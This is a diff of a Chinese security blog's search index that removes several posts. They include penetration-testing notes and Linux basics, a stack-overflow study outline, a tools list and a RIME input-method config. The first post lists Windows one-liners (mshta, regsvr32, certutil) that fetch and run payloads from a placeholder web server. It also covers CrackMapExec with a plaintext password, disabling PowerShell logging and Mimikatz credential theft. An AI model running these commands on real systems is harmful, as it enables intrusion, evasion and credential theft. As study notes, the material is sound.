-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LINUX OS</title>
-    <url>/2022/03/22/LINUX-OS/</url>
-    <content><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol>
-<li>MBR：主引导记录</li>
-<li>grub2引导<br>(grub「grand unified bootloader 宏大的统一引导启动程序」：幼虫，搜寻)<ol>
-<li>boot.img</li>
-<li>core.img</li>
-<li>*.mod</li>
-<li>grub.cfg<br> a. 未独立&#x2F;boot：&#x2F;boot&#x2F;grub2&#x2F;grub.cfg<br> b. 独立&#x2F;boot:&#x2F;grub2&#x2F;grub.cfg</li>
-<li>grun2-setpassword：设置引导密码</li>
-</ol>
-</li>
-<li>init：PID&#x3D;1（进程号）<ol>
-<li>centos7第一个进程：systemd（配置文件：&#x2F;usr&#x2F;system&#x2F;systemd&#x2F;）</li>
-<li>执行登录 &#x2F;bin&#x2F;login</li>
-</ol>
-</li>
-<li>demesg | less：“|”管道符，左侧命令输出作为右侧的输入</li>
-<li>&#x2F;dev：设备 –&gt; 文件</li>
-<li>&#x2F;usr：unix shared resources（共享资源）「类似win的Program Files」</li>
-<li>&#x2F;src：原文件</li>
-<li>&#x2F;tmp：临时文件</li>
-<li>&#x2F;var（variable）：日志文件、打印机脱机工作文件、缓冲区</li>
-<li>&#x2F;opt（option）：选项文件</li>
-<li>&#x2F;mnt（mount）：挂载</li>
-<li>cd：change directory</li>
-<li>文件类型：<ol>
-<li>d：目录</li>
-<li>l：链接</li>
-<li>b：块设备</li>
-<li>c：字符设备文件</li>
-<li>-：普通文件</li>
-</ol>
-</li>
-<li>文件权限：<ol>
-<li>用户组：U &#x2F; G &#x2F; A</li>
-<li>九位字母表示法：d[文件类型] rwx[文件属主] r-x[同组用户] r–[其他用户]</li>
-</ol>
-</li>
-<li>cat快速编辑：<ol>
-<li>cat&gt;test</li>
-<li>[输入字符]</li>
-</ol>
-</li>
-<li>tail &amp; head：查看后十行，前十行 &#x2F;&#x2F;-n num : 指定行数</li>
-<li>mdir [ -m ] [ -p 目录名 ]</li>
-<li>rmdir（remove dir）：用于删除空目录<ol>
-<li>rm -r</li>
-</ol>
-</li>
-<li>touch：修改时间属性 * （不存在）创建文件</li>
-<li>软链接：ln -s</li>
-<li>硬链接：ln<ol>
-<li>以文件副本形式存在，不占用实际控件</li>
-<li>不允许目录硬链接</li>
-<li>只有在同一个文件系统才允许硬链接</li>
-</ol>
-</li>
-<li>查找类：which、whereis、find、grep</li>
-<li>文件重定向：<ul>
-<li>&#x2F;dev&#x2F;stdin：标准输入文件</li>
-<li>&#x2F;dev&#x2F;stdout：标准输出文件</li>
-</ul>
-<ol>
-<li>输出重定向<ol>
-<li>“&gt;”：文件存在，覆盖</li>
-<li>“&gt;&gt;”：文件存在，添加内容到文件末尾</li>
-</ol>
-</li>
-<li>输入重定向<ol>
-<li>“&lt;”</li>
-</ol>
-</li>
-<li>管道符重定向：“|” 左输出为右输入</li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>开源项目</category>
-        <category>LINUX OS</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LINUX-PENETRATION</title>
     <url>/2021/12/25/LINUX-PENETRATION/</url>
     <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
@@ -991,210 +1181,6 @@
         <tag>渗透</tag>
         <tag>网络空间安全</tag>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MY FAVOR TOOLS BANK (我的&quot;武器/装备&quot;库)</title>
-    <url>/2022/03/22/My-Attack-Tools/</url>
-    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
-      <categories>
-        <category>开源项目</category>
-        <category>software</category>
-      </categories>
-      <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ODAY-软件漏洞分析</title>
-    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
-<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
-<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
-</ul>
-</li>
-<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
-<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
-<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
-<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
-<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
-<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
-<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
-</ul>
-</li>
-<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
-<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
-<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
-</ul>
-</li>
-<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
-<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
-<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
-<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
-<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
-<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
-<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
-<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
-<li><a href="#gs">GS</a></li>
-<li><a href="#safeseh">SafeSEH</a></li>
-<li><a href="#dep">DEP</a></li>
-<li><a href="#aslr">ASLR</a></li>
-<li><a href="#sehop">SEHOP</a></li>
-<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
-</ul>
-</li>
-<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
-<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
-</ul>
-<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
-<li>BUG：功能性逻辑缺陷</li>
-<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
-<li>0day响应：<ol>
-<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
-<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
-<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
-</ol>
-</li>
-<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
-<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
-<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
-<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
-<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
-<li>.reloc 、.edata 、.tls 、.rdata</li>
-</ol>
-</li>
-<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
-<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
-<li>文件偏移地址（File Offset）</li>
-<li>装载基址（Image Base）</li>
-<li>虚拟内存地址（Virtual Address,VA）</li>
-<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
-</ol>
-</li>
-</ol>
-<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
-<li><p>OllyDbg</p>
-</li>
-<li><p>SoftICE</p>
-</li>
-<li><p>WinDbg</p>
-</li>
-<li><p>IDE Pro</p>
-</li>
-<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
-</li>
-<li><p>虚拟机</p>
-</li>
-<li><p>Crack二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
-<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
-<li>代码区：cpu在此区域取值执行</li>
-<li>数据区：存储全局变量等</li>
-<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
-<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
-</ol>
-</li>
-<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
-<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
-<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
-<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
-<li>局部变量：为函数局部变量开辟内存空间</li>
-<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
-<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
-</ol>
-</li>
-<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
-</ol>
-</li>
-<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
-</ol>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>C</th>
-<th>SysCall</th>
-<th>StdCall</th>
-<th>BASIC</th>
-<th>FORTRAN</th>
-<th>PASCAL</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>参数入栈顺序</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-</tr>
-<tr>
-<td>恢复栈平衡操作的位置</td>
-<td>母函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-</tr>
-</tbody></table>
-<ol start="4">
-<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
-<li>参数入栈：按入栈顺序</li>
-<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
-<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
-<li>栈帧调整：<ol>
-<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
-<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
-<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
-</li>
-<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
-<li>保存返回值：通常保存在寄存器EAX</li>
-<li>弹出当前栈帧，恢复上一个栈帧<ol>
-<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
-<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
-<li>将函数返回地址弹给EIP寄存器</li>
-</ol>
-</li>
-<li>跳转：按照返回地址跳回母函数继续执行</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>安全漏洞</tag>
-        <tag>0day</tag>
-        <tag>Stack overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RIME CONFIG GUIDE</title>
-    <url>/2021/12/25/RIME-CONfIG/</url>
-    <content><![CDATA[<ol>
-<li><h2 id="x2F-config-x2F-ibus-x2F-rime-x2F-build-x2F-ibus-rime-yaml-ibus-rime候选横竖列文件"><a href="#x2F-config-x2F-ibus-x2F-rime-x2F-build-x2F-ibus-rime-yaml-ibus-rime候选横竖列文件" class="headerlink" title="~&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml    #ibus-rime候选横竖列文件"></a>~&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml    #ibus-rime候选横竖列文件</h2></li>
-<li><h2 id="x2F-home-x2F-blackcat-x2F-config-x2F-ibus-x2F-rime-x2F-default-custom-yaml"><a href="#x2F-home-x2F-blackcat-x2F-config-x2F-ibus-x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;home&#x2F;blackcat&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;home&#x2F;blackcat&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;default.custom.yaml</h2> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	&quot;menu/page_size&quot;: 7 #每页候选词个数</span><br><span class="line">	&quot;ascii_composer/switch_key/Shift_L&quot;: commit_code #左shift提交字母</span><br><span class="line">	&quot;style/horizontal&quot;: true      # 候選橫排</span><br></pre></td></tr></table></figure></li>
-<li><h2 id="x2F-home-x2F-blackcat-x2F-config-x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-home-x2F-blackcat-x2F-config-x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;home&#x2F;blackcat&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;home&#x2F;blackcat&#x2F;.config&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h2> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">  	switches:                   # 注意縮進</span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: 0                # reset 0 的作用是當從其他輸入方案切換到本方案時，</span><br><span class="line">	states: [ 中文, 西文 ]  # 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span><br><span class="line">	- name: full_shape        # 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span><br><span class="line">	states: [ 半角, 全角 ]  # 而全／半角則可沿用之前方案中的用法。</span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: 1                # 增加這一行：默認啓用「繁→簡」轉換。</span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-        <tag>open source</tag>
       </tags>
   </entry>
   <entry>
@@ -1526,6 +1512,54 @@
       <tags>
         <tag>程序开发安全</tag>
         <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RIME CONFIG GUIDE</title>
+    <url>/2021/12/25/RIME-CONfIG/</url>
+    <content><![CDATA[<h1 id="x2F-rime-x2F-build-x2F-ibus-rime-yaml"><a href="#x2F-rime-x2F-build-x2F-ibus-rime-yaml" class="headerlink" title="&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml"></a>&#x2F;rime&#x2F;build&#x2F;ibus_rime.yaml</h1><p>ibus-rime候选横竖列文件</p>
